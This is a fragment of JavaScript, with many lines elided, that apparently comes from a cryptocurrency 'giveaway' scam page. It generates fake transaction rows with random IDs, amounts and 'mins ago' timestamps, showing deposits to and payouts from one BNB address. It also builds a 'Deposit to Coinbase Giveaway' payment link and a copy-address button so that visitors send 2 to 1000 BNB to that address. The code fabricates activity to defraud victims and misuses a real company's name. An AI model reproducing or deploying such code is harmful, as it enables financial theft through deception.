...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell leadger"><a >' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span> </td> <td><a class="hash-tag text-truncate" >' +
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bnb13hp3uu729h9q27nfrupzgu3lkffjlqdxd4hcs2</span> </td> <td>' +
    conamount +
    ' BNB</td> <td><span class="grat-bgg">' +
    tx(999999) +
    '</span></td> </tr>'
  var table,
    row = (table = document.getElementById('myTable')).insertRow(1),
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">bnb13hp3uu729h9q27nfrupzgu3lkffjlqdxd4hcs2</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" >' +
    address +
    '</a> </td> <td>' +
    outcon +
    ' BNB</td> <td><span class="grat-bgg">' +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      ;(row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell leadger"><a >' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">bnb13hp3uu729h9q27nfrupzgu3lkffjlqdxd4hcs2</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" >' +
        address +
        '</a> </td> <td>' +
        outcon +
        ' BNB</td> <td><span class="grat-bgg">' +
    ...
    ;($('#cal-in').val() >= 2) & ($('#cal-in').val() <= 1000)
      ? ($('#warn').text(''),
        ...
        $('#paynow')
          ...
          .attr(
            'href',
            'ripple:bnb13hp3uu729h9q27nfrupzgu3lkffjlqdxd4hcs2?amount=' +
              amount_entered +
              '&message=Deposit+to+Coinbase+Giveaway+' +
              tm,
          ),
        $('.pop-body').css('display', 'flex'))
      : $('#warn').text('Amount should be within 1.5 BNB to 1000 BNB')
  }),
  $('#close').click(() => {
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'bnb13hp3uu729h9q27nfrupzgu3lkffjlqdxd4hcs2',
  )
